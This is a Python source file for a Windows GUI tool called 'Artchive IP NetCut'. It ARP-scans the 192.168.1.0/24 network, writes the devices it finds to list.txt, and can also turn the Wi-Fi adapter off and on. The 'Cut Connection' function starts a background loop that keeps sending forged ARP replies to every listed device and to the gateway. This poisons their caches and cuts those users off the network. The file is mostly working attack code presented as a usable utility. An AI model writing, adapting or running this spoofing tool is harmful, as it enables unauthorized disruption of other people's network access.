import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading
import os
import sys
import time
from datetime import datetime
from scapy.all import ARP, Ether, srp, sendp, get_if_list, get_if_hwaddr, conf
from scapy.arch.windows import get_windows_if_list
import wmi

WIFI_NAME = "Wi-Fi"

# ----------- WiFi Control -----------
def get_wifi_adapter():
    c = wmi.WMI()
    for nic in c.Win32_NetworkAdapter():
        if nic.NetConnectionID == WIFI_NAME:
            return nic
    return None

def disable_wifi():
    adapter = get_wifi_adapter()
    if adapter:
        adapter.Disable()
        messagebox.showinfo("WiFi Disabled", f"WiFi adapter '{WIFI_NAME}' has been disabled.")
    else:
        messagebox.showerror("Error", "WiFi adapter not found.")

def enable_wifi():
    adapter = get_wifi_adapter()
    if adapter:
        adapter.Enable()
        messagebox.showinfo("WiFi Enabled", f"WiFi adapter '{WIFI_NAME}' has been enabled.")
    else:
        messagebox.showerror("Error", "WiFi adapter not found.")

# ----------- ARP Scan -----------
def scan_network(iface):
    try:
        your_mac = get_if_hwaddr(iface)
    except Exception as e:
        messagebox.showerror("Error", f"Failed to get MAC address: {e}")
        return

    target_ip = "192.168.1.1/24"
    packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=your_mac) / ARP(pdst=target_ip, hwsrc=your_mac)

    try:
        ans, _ = srp(packet, timeout=2, iface=iface, inter=0.1, verbose=False)
    except Exception as e:
        messagebox.showerror("Error", f"Failed to send packets: {e}")
        return

    existing = {}
    if os.path.exists("list.txt"):
        with open("list.txt", "r") as f:
            for line in f:
                if '-' in line and not line.startswith('#'):
                    ip, mac = map(str.strip, line.strip().split('-'))
                    existing[mac.lower()] = ip.strip()

    result = "[INFO] Devices Found:\n"
    for _, rcv in ans:
        ip = rcv.psrc
        mac = rcv.hwsrc.lower()
        existing[mac] = ip
        result += f"{ip} - {mac}\n"

    with open("list.txt", "w") as f:
        f.write(f"# Scan result - {datetime.now()}\n")
        for mac, ip in existing.items():
            f.write(f"{ip} - {mac}\n")

    messagebox.showinfo("Scan Complete", result)

# ----------- ARP Spoof -----------
def cut_connection(iface):
    conf.iface = iface
    try:
        your_mac = get_if_hwaddr(iface)
    except Exception as e:
        messagebox.showerror("Error", f"Failed to get MAC address: {e}")
        return

    gateway_ip = "192.168.1.1"

    def spoof(ip, target_mac, spoof_ip):
        pkt = Ether(dst=target_mac, src=your_mac) / ARP(op=2, pdst=ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=your_mac)
        sendp(pkt, iface=iface, verbose=False)

    targets = []
    try:
        with open("list.txt", "r") as f:
            lines = f.readlines()
            for line in lines:
                if line.strip() and not line.startswith("#"):
                    parts = line.strip().split(" - ")
                    if len(parts) == 2:
                        ip, mac = parts
                        targets.append((ip.strip(), mac.strip()))
    except FileNotFoundError:
        messagebox.showerror("Error", "list.txt not found.")
        return

    def attack():
        try:
            while True:
                for ip, mac in targets:
                    spoof(ip, mac, gateway_ip)
                    spoof(gateway_ip, mac, ip)
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    thread = threading.Thread(target=attack, daemon=True)
    thread.start()
    messagebox.showinfo("Active", "ARP Spoofing is running in the background. Use Ctrl+C or close the app to stop.")

# ----------- GUI -----------
def run():
    app = tk.Tk()
    app.title("Artchive IP NetCut")
    app.geometry("440x360")
    app.resizable(False, False)

    tk.Label(app, text="Artchive IP NetCut", font=("Arial", 14, "bold")).pack(pady=10)

    interface_data = get_windows_if_list()
    iface_names = [i['name'] for i in interface_data]
    iface_map = {i['name']: i for i in interface_data}

    tk.Label(app, text="Select Network Interface:").pack()
    iface_var = tk.StringVar()
    iface_dropdown = ttk.Combobox(app, textvariable=iface_var, values=iface_names, state="readonly", width=50)
    iface_dropdown.pack(pady=5)
    iface_dropdown.current(0)

    detail_text = tk.Text(app, height=4, width=60, state='disabled')
    detail_text.pack(pady=5)

    def update_details(event):
        selected = iface_var.get()
        detail = iface_map.get(selected, {})
        detail_str = f"Name: {detail.get('name', '')}\nDescription: {detail.get('description', '')}\nIP: {detail.get('ip', '')}\nMAC: {detail.get('mac', '')}"
        detail_text.config(state='normal')
        detail_text.delete(1.0, tk.END)
        detail_text.insert(tk.END, detail_str)
        detail_text.config(state='disabled')

    iface_dropdown.bind("<<ComboboxSelected>>", update_details)
    update_details(None)

    tk.Button(app, text="Scan Network", width=40, command=lambda: scan_network(iface_var.get())).pack(pady=5)
    tk.Button(app, text="Cut Connection", width=40, command=lambda: cut_connection(iface_var.get())).pack(pady=5)

    # New Section: Primary Connection Settings
    tk.Label(app, text="Primary Connection Control:", font=("Arial", 10, "bold")).pack(pady=5)
    tk.Button(app, text="Disable WiFi (Use Ethernet Only)", width=40, command=disable_wifi).pack(pady=2)
    tk.Button(app, text="Enable WiFi (Back to Normal)", width=40, command=enable_wifi).pack(pady=2)

    tk.Label(app, text="by Artchive DMZ (Moch Dimas Almahtar)", font=("Arial", 8)).pack(side="bottom", pady=5)

    app.mainloop()

if __name__ == "__main__":
    run()
